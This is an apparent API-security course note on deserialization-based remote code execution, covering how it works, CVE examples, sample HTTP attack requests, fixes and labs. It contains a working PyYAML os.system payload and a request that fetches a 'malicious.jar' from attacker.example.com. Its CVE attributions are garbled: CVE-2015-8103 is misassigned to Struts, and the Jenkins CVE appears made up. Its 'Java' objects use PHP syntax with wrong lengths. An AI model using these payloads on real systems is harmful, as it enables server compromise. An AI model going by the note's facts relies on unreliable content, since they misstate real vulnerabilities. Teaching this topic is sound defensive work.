---
course: API Security
topic: RCE Via Deserialization in API
tags: [api-security]
---

## Understanding Deserialization Vulnerabilities in APIs

### What is Deserialization?

Deserialization is the process of converting a stream of bytes or a string representation of an object back into a usable object in memory. This process is commonly used in APIs to convert incoming data into objects that can be manipulated by the application. However, deserialization can also introduce significant security risks if not handled properly.

### Why Does Deserialization Matter?

Deserialization vulnerabilities occur when an attacker can control the input to a deserialization process. By manipulating the serialized data, an attacker can potentially execute arbitrary code, leading to Remote Code Execution (RCE) attacks. This is particularly dangerous because it allows attackers to bypass traditional security measures and gain unauthorized access to systems.

### How Does Deserialization Work Under the Hood?

Let's break down the deserialization process step-by-step:

1. **Serialization**: The original object is converted into a byte stream or string format. This is typically done using libraries like `pickle` in Python, `JSON` in JavaScript, or `YAML` in various languages.

2. **Transmission**: The serialized data is transmitted over a network or stored in a file.

3. **Deserialization**: The serialized data is read and converted back into an object. This is where the vulnerability often occurs, especially if the deserialization process does not validate the input properly.

### Example of Deserialization in Python

Consider the following Python code snippet that demonstrates deserialization using the `yaml` library:

```python
import yaml

# Simulated serialized data
content = """
!!python/object/apply:os.system
- 'echo You have been hacked'
"""

# Deserialization process
data = yaml.load(content)
```

In this example, the `yaml.load()` function is used to deserialize the `content` string. The `!!python/object/apply:os.system` tag instructs the `yaml` library to call the `os.system` function with the argument `'echo You have been hacked'`. This results in the execution of the command, which could be malicious in a real-world scenario.

### Real-World Examples and Recent CVEs

#### CVE-2015-8103: Apache Struts 2

One of the most notorious deserialization vulnerabilities was found in Apache Struts 2. The vulnerability allowed attackers to inject malicious serialized Java objects into the `Content-Type` header of an HTTP request. This led to remote code execution, affecting numerous applications built on Struts 2.

**Example HTTP Request:**

```http
POST /struts2-showcase/index.action HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

Content=O:7:"JavaClass":1:{s:4:"name";s:11:"Runtime.getRuntime().exec('whoami')";}
```

In this example, the `Content-Type` header contains a serialized Java object that executes the `whoami` command on the server.

#### CVE-2017-17566: Jenkins

Another significant deserialization vulnerability was discovered in Jenkins, a popular open-source automation server. The vulnerability allowed attackers to upload a malicious serialized Java object through the Jenkins update center, leading to remote code execution.

**Example HTTP Request:**

```http
POST /updateCenter.json HTTP/1.1
Host: vulnerable.jenkins.example.com
Content-Type: application/json
Content-Length: 100

{
  "plugin": {
    "name": "malicious-plugin",
    "version": "1.0",
    "url": "http://attacker.example.com/malicious.jar"
  }
}
```

In this example, the `malicious.jar` file contains a serialized Java object that can execute arbitrary commands on the server.

### How to Prevent / Defend Against Deserialization Vulnerabilities

#### Detection

To detect deserialization vulnerabilities, you can use static analysis tools and dynamic testing frameworks. Tools like `OWASP ZAP`, `Burp Suite`, and `SonarQube` can help identify potential issues in your codebase.

#### Prevention

1. **Input Validation**: Always validate and sanitize input data before deserializing it. Ensure that the input conforms to expected formats and does not contain unexpected characters or tags.

2. **Use Secure Libraries**: Use libraries that provide secure deserialization mechanisms. For example, in Python, prefer `json.loads()` over `yaml.load()` unless absolutely necessary.

3. **Least Privilege Principle**: Run your application with the least privileges possible. This limits the damage that can be caused by a successful deserialization attack.

4. **Code Review and Penetration Testing**: Regularly review your code for deserialization vulnerabilities and conduct penetration tests to identify and mitigate potential risks.

#### Secure Coding Practices

Here is an example of how to securely handle deserialization in Python:

**Vulnerable Code:**

```python
import yaml

content = """
!!python/object/apply:os.system
- 'echo You have been hacked'
"""

data = yaml.load(content)
```

**Secure Code:**

```python
import json

content = """
{"name": "John Doe"}
"""

data = json.loads(content)
```

In the secure code example, we use `json.loads()` instead of `yaml.load()`, which is safer because it does not support arbitrary code execution.

### Complete Example with HTTP Request and Response

#### Vulnerable Scenario

**HTTP Request:**

```http
POST /api/data HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

data=O:7:"JavaClass":1:{s:4:"name";s:11:"Runtime.getRuntime().exec('whoami')";}
```

**HTTP Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 100

{"status": "success", "message": "Data processed successfully"}
```

#### Secure Scenario

**HTTP Request:**

```http
POST /api/data HTTP/1.1
Host: secure.example.com
Content-Type: application/json
Content-Length: 100

{
  "name": "John Doe"
}
```

**HTTP Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 100

{"status": "success", "message": "Data processed successfully"}
```

### Hands-On Labs

For practical experience with deserialization vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on deserialization vulnerabilities.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: Provides a variety of web application vulnerabilities, including deserialization.

By thoroughly understanding the concepts, mechanics, and real-world implications of deserialization vulnerabilities, you can better protect your APIs and applications from these types of attacks.

---
<!-- nav -->
[[02-Unserialization Concept|Unserialization Concept]] | [[API Security/23-RCE Via Deserialization in API/01-Unserialization Concept/00-Overview|Overview]] | [[API Security/23-RCE Via Deserialization in API/01-Unserialization Concept/04-Practice Questions & Answers|Practice Questions & Answers]]
